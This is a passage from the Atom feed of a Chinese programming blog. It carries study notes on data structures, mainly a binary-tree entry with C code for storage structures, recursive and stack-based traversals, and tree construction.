class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    LinkedGraph g;</span><br><span class="line">    <span class="keyword">int</span> count;</span><br><span class="line">    create(&amp;g,<span class="string">&quot;g7.txt&quot;</span>,<span class="number">0</span>);  <span class="comment">// 0 代表无向图</span></span><br><span class="line">    count = BfsTraverse(g);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n 该图共有 %d 个连通分量。\n&quot;</span>,count);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="数据结构" scheme="https://xizhi-future.github.io/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"/>
    
    
  </entry>
  
  <entry>
    <title>二叉树</title>
    <link href="https://xizhi-future.github.io/2021/11/13/%E4%BA%8C%E5%8F%89%E6%A0%91/"/>
    <id>https://xizhi-future.github.io/2021/11/13/%E4%BA%8C%E5%8F%89%E6%A0%91/</id>
    <published>2021-11-13T01:02:23.000Z</published>
    <updated>2021-11-14T09:28:48.479Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="二叉树"><a href="#二叉树" class="headerlink" title="二叉树"></a>二叉树</h1><h2 id="1-1-概念"><a href="#1-1-概念" class="headerlink" title="1.1 概念"></a>1.1 概念</h2><p>由结点构成的有限集合，集合可为空，或者是由一个根结点以及两颗互不相交的分别称作 该根结点的左子树域右子树的二叉树组成。</p><p>空二叉树</p><p><strong>二叉树五种基本形态</strong></p><p><img src="https://i.loli.net/2021/10/30/QzNZd9lI8VtuiMG.png" alt="image-20211030164242923"></p><blockquote><p><strong>二叉树与一般的树型结构的区别在于：</strong></p><ul><li>二叉树中每个非空结点最多只有两个子女，而一般的树型结构中每个非空结点可以有0到多<br>个子女;</li><li>二叉树中结点的子树要区分左子树和右子树，即使在结点只有一棵子树的情况下也要明确指<br>出是左子树还是右子树。</li></ul></blockquote><h2 id="1-2-二叉树-性质"><a href="#1-2-二叉树-性质" class="headerlink" title="1.2 二叉树 性质"></a>1.2 二叉树 性质</h2><ul><li><p><strong>性质1：</strong>一棵非空二叉树的 <code>第i层</code>  上至多有 <code>2 的 i-1 次方</code>  个 结点 (i≥1)。</p></li><li><p><strong>性质2：</strong>深度为h的二叉树至多有 <code>2 的 h 次方 -1</code> 个结点(h&gt;1) 。</p></li><li><p><strong>性质3：</strong> 对于任何一棵二叉树T，如果其终端结点数为no，度为2的结点数为n2，则 no=n2+1。</p></li><li><p><strong>性质4：</strong>具有 n 个结点的完全二叉树的深度 是 <code>[log以2为底n的对数] + 1</code></p></li></ul><p><strong>其它性质：</strong></p><p><img src="https://i.loli.net/2021/10/30/4kDm5FiaLGntrZe.png" alt="image-20211030164825001"></p><p><strong>完全二叉树、满二叉树：</strong></p><p><img src="https://i.loli.net/2021/10/30/9pg6GoC28vPEsVu.png" alt="image-20211030164916049"></p><p><strong>完全二叉树的性质：</strong></p><p><img src="https://i.loli.net/2021/10/30/d7EBmp4CgeXqG58.png" alt="image-20211030165111674"></p><h2 id="1-3-二叉树的-存储结构"><a href="#1-3-二叉树的-存储结构" class="headerlink" title="1.3 二叉树的 存储结构"></a>1.3 二叉树的 存储结构</h2><h3 id="1-3-1-完全二叉树-的-顺序存储"><a href="#1-3-1-完全二叉树-的-顺序存储" class="headerlink" title="1.3.1 完全二叉树 的 顺序存储"></a>1.3.1 完全二叉树 的 顺序存储</h3><p>按照 二叉树 从上到下、同一层次 从左到右的顺序，依次将结点存储在 一个 <strong>一维数组</strong> 中。</p><p>利用完全二叉树的性质</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAXSIZE 20</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">char</span> datatype;  <span class="comment">//二叉树结点类型</span></span><br><span class="line">datatype tree[MAXSIZE];</span><br><span class="line"><span class="keyword">int</span> n;  <span class="comment">//树 实际所含结点个数</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/10/30/f6vuodkaFwZjc9Y.png" alt="image-20211030165424030"></p><h3 id="1-3-2-一般二叉树-的-顺序存储"><a href="#1-3-2-一般二叉树-的-顺序存储" class="headerlink" title="1.3.2 一般二叉树 的 顺序存储"></a>1.3.2 一般二叉树 的 顺序存储</h3><p>每个结点：三个域</p><p>值域：data</p><p><strong>不带双亲：</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAXSIZE 20</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">char</span> datatype;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span>     <span class="comment">//结点值类型</span></span><br><span class="line">    datatype data;</span><br><span class="line">    <span class="keyword">int</span> lchild,rchild;  <span class="comment">//存放 左、右 子女下标</span></span><br><span class="line">&#125;node;</span><br><span class="line"></span><br><span class="line">node tree[MAXSIZE];  </span><br><span class="line"><span class="keyword">int</span> n;<span class="comment">//树中实际所含结点个数</span></span><br><span class="line"><span class="keyword">int</span> root;<span class="comment">//存放根结点的下标</span></span><br></pre></td></tr></table></figure><p><strong>带双亲：</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAXSIZE 20</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">char</span> datatype;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">    datatype data;</span><br><span class="line">    <span class="keyword">int</span> lchild,rchild;</span><br><span class="line">    <span class="keyword">int</span> parent;  <span class="comment">//存放双亲结点下标</span></span><br><span class="line">&#125;node;</span><br><span class="line"></span><br><span class="line">node tree[MAXSIZE];</span><br><span class="line"><span class="keyword">int</span> n;</span><br><span class="line"><span class="keyword">int</span> root;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/10/30/SCeVzquhiojcy5A.png" alt="image-20211030165952310"></p><h3 id="1-3-2-链式存储"><a href="#1-3-2-链式存储" class="headerlink" title="1.3.2 链式存储"></a>1.3.2 链式存储</h3><p>每个结点：三个域</p><p>值域：data</p><p>指针域：分别指向左右子树</p><p><strong>不带双亲：</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">char</span> datatype;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">node</span>&#123;</span>    <span class="comment">//二叉树结点类型</span></span><br><span class="line">    datatype data;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">node</span> *<span class="title">lchild</span>,*<span class="title">rchild</span>;</span>  <span class="comment">//指向左右子树的指针</span></span><br><span class="line">&#125;bintnode;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> bintnode *bintree;</span><br><span class="line">bintree root;</span><br></pre></td></tr></table></figure><p><strong>带双亲：</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">char</span> datatype;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">node</span>&#123;</span>   <span class="comment">//二叉树结点类型</span></span><br><span class="line">    datatype data;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">node</span> *<span class="title">lchild</span>,*<span class="title">rchild</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">node</span> *<span class="title">parent</span>;</span>  <span class="comment">//指向双亲的指针</span></span><br><span class="line">&#125;bintnode;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> bintnode *bintree;</span><br><span class="line">bintree root;<span class="comment">//指向二叉树根结点的指针</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/10/30/mFjtMqDdRkezGc2.png" alt="image-20211030170230015"></p><h2 id="1-4-二叉树的遍历-—–-递归实现"><a href="#1-4-二叉树的遍历-—–-递归实现" class="headerlink" title="1.4 二叉树的遍历  —– 递归实现"></a>1.4 二叉树的遍历  —– 递归实现</h2><p>按照一定的顺序对二叉树这每个结点进行访问，且只能访问一次。</p><p><img src="https://i.loli.net/2021/10/30/YIS3fLvetOKocgH.png" alt="image-20211030171335598"></p><h3 id="1-4-1-前序遍历-—-根-gt-左-gt-右"><a href="#1-4-1-前序遍历-—-根-gt-左-gt-右" class="headerlink" title="1.4.1 前序遍历 —- 根-&gt;左-&gt;右"></a>1.4.1 前序遍历 —- <code>根-&gt;左-&gt;右</code></h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">preorder</span><span class="params">(bintree t)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(t)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,t-&gt;data);</span><br><span class="line">        preorder(t-&gt;lchild);</span><br><span class="line">        preorder(t-&gt;rchild);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="1-4-2-中序遍历-—-左-gt-根-gt-右"><a href="#1-4-2-中序遍历-—-左-gt-根-gt-右" class="headerlink" title="1.4.2 中序遍历 —- 左-&gt;根-&gt;右"></a>1.4.2 中序遍历 —- <code>左-&gt;根-&gt;右</code></h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">inorder</span><span class="params">(bintree t)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(t)&#123;</span><br><span class="line">        inorder(t-&gt;lchild);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,t-&gt;data);</span><br><span class="line">        inorder(t-&gt;rchild);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="1-4-3-后序遍历-—-左-gt-右-gt-根"><a href="#1-4-3-后序遍历-—-左-gt-右-gt-根" class="headerlink" title="1.4.3 后序遍历 —- 左-&gt;右-&gt;根"></a>1.4.3 后序遍历 —- <code>左-&gt;右-&gt;根</code></h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">postorder</span><span class="params">(bintree t)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(t)&#123;</span><br><span class="line">        postorder(t-&gt;lchild);</span><br><span class="line">        postorder(t-&gt;rchild);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,t-&gt;data);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="1-5-二叉树的创建"><a href="#1-5-二叉树的创建" class="headerlink" title="1.5 二叉树的创建"></a>1.5 二叉树的创建</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//按照前序遍历的结果创建一颗 给定 二叉树</span></span><br><span class="line"><span class="function">bintree <span class="title">createbintree</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> ch;</span><br><span class="line">    bintree t;</span><br><span class="line">    <span class="keyword">if</span>((ch = getchar()) == <span class="string">&#x27;#&#x27;</span>) <span class="comment">//空子树</span></span><br><span class="line">        t = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        t = (bintree *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(bintnode));</span><br><span class="line">        t-&gt;data = ch;</span><br><span class="line">        t-&gt;lchild = createbintree();</span><br><span class="line">        t-&gt;rchild = createbintree();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> t;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//注：输入时，必须按照 前序遍历 的顺序进行输入</span></span><br></pre></td></tr></table></figure><h2 id="1-6-二叉树的遍历-—–-非递归实现"><a href="#1-6-二叉树的遍历-—–-非递归实现" class="headerlink" title="1.6 二叉树的遍历  —– 非递归实现"></a>1.6 二叉树的遍历  —– 非递归实现</h2><p>二叉树的 递归遍历 算法较简易，但是运行时间长，执行效率较低，下面是非递归算法实现二叉树的遍历。</p><p><strong>使用一个 <code>栈</code> 来进行回溯</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//顺序栈的定义</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">stack</span>&#123;</span></span><br><span class="line">    bintree data[<span class="number">100</span>];</span><br><span class="line">    <span class="keyword">int</span> tag[<span class="number">100</span>];<span class="comment">//为栈中每个元素设置的标记，便于 后序遍历</span></span><br><span class="line">    <span class="keyword">int</span> top;<span class="comment">//栈顶指针</span></span><br><span class="line">&#125;seqstack;</span><br><span class="line"></span><br><span class="line"><span class="comment">//进栈</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">push</span><span class="params">(seqstack *s,bintree)</span></span>&#123;</span><br><span class="line">    s-&gt;data[s-&gt;top] = t;</span><br><span class="line">    s-&gt;top++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//出栈</span></span><br><span class="line"><span class="function">bintree <span class="title">pop</span><span class="params">(seqstack *s)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(s-&gt;top != <span class="number">0</span>)&#123;  <span class="comment">//判空</span></span><br><span class="line">        s-&gt;top--;</span><br><span class="line">        <span class="keyword">return</span>(s-&gt;data[s-&gt;top]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="1-6-1-前序遍历-—-根-gt-左-gt-右"><a href="#1-6-1-前序遍历-—-根-gt-左-gt-右" class="headerlink" title="1.6.1 前序遍历 —- 根-&gt;左-&gt;右"></a>1.6.1 前序遍历 —- <code>根-&gt;左-&gt;右</code></h3><ul><li><p>当访问完 根结点之后，紧接着该访问其左子树，但前提是必须先使 当前结点放于 栈中保存起来，便于之后 右子树的访问。</p></li><li><p>当栈中的元素位于栈顶即将出栈时，则意味着根结点和左子树已经访问完成，出栈之后即可进行右子树的访问。</p></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">preorder</span><span class="params">(bintree t)</span></span>&#123;</span><br><span class="line">    seqstack s;</span><br><span class="line">    s.top = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>((t) || (s.top!=<span class="number">0</span>))&#123;<span class="comment">//当前处理的子树不为空栈 或 栈不为空 时</span></span><br><span class="line">        <span class="keyword">if</span>(t)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,t-&gt;data);</span><br><span class="line">            push(&amp;s,t);</span><br><span class="line">            t = t-&gt;lchild;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            t = pop(&amp;s);</span><br><span class="line">            t = t-&gt;rchild;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="1-6-2-中序遍历-—-左-gt-根-gt-右"><a href="#1-6-2-中序遍历-—-左-gt-根-gt-右" class="headerlink" title="1.6.2 中序遍历 —- 左-&gt;根-&gt;右"></a>1.6.2 中序遍历 —- <code>左-&gt;根-&gt;右</code></h3><ul><li><p>首先访问 左子树，但由于此时 根结点和 右子树都未进行访问，则 需要将其 先放入栈中保存起来，以便之后对根结点和右子树的访问。</p></li><li><p>当栈中元素位于栈顶即将出栈时，即意味着其左子树已经访问完成，出栈后 则可 进行根结点和右子树的访问。</p></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">inorder</span><span class="params">(bintree t)</span></span>&#123;</span><br><span class="line">    seqstack s;</span><br><span class="line">    s.top = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>((t!=<span class="literal">NULL</span>) || (s.top!=<span class="number">0</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(t)&#123;</span><br><span class="line">            push(&amp;s,t);</span><br><span class="line">            t = t-&gt;lchild;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            t = pop(&amp;s);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,t-&gt;data);</span><br><span class="line">            t = t-&gt;rchild;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="1-6-3-后序遍历-—-左-gt-右-gt-根"><a href="#1-6-3-后序遍历-—-左-gt-右-gt-根" class="headerlink" title="1.6.3 后序遍历 —- 左-&gt;右-&gt;根"></a>1.6.3 后序遍历 —- <code>左-&gt;右-&gt;根</code></h3><ul><li><p>首先进行左子树的访问，同样需要将其先保存在栈中，便于之后对其 右子树以及根节点的访问。</p></li><li><p>需要使用 <code>seqstack类型  中的  数组 tag</code> ，其每个元素的值为0 或 1，用于标识栈中每个元素的状态。</p><p>当一个元素刚刚进栈时，当它第一次位于栈顶即将被处理时，其 tag 值为 0，意味着它的 右子树还没有进行访问，则接下来就应该访问它的 右子树，该元素仍旧在栈中，然后将其 tag 值改为 1，意味着此时其 右子树已经访问完成，当其第二次出现在栈顶即将被处理时，则意味着接下来应该访问它本身，即根结点，并将其出栈。</p></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">postorder</span><span class="params">(bintree t)</span></span>&#123;</span><br><span class="line">    seqstack s;</span><br><span class="line">    s.top = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>((t) || (s.top!=<span class="number">0</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(t)&#123;</span><br><span class="line">            s.data[s.top] = t;</span><br><span class="line">            s.tag[s.top] = <span class="number">0</span>;</span><br><span class="line">            s.top++;</span><br><span class="line">            t = t-&gt;lchild;</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(s.tag[s.top<span class="number">-1</span>] == <span class="number">1</span>)&#123;</span><br><span class="line">            s.top--;</span><br><span class="line">            t = s.data[s.top];</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,t-&gt;data);</span><br><span class="line">            t = <span class="literal">NULL</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            t = s.data[s.top<span class="number">-1</span>];</span><br><span class="line">            s.tag[s.top<span class="number">-1</span>] = <span class="number">1</span>;</span><br><span class="line">            t = t-&gt;rchild;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="数据结构" scheme="https://xizhi-future.github.io/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"/>
    
    
  </entry>
  
</feed>
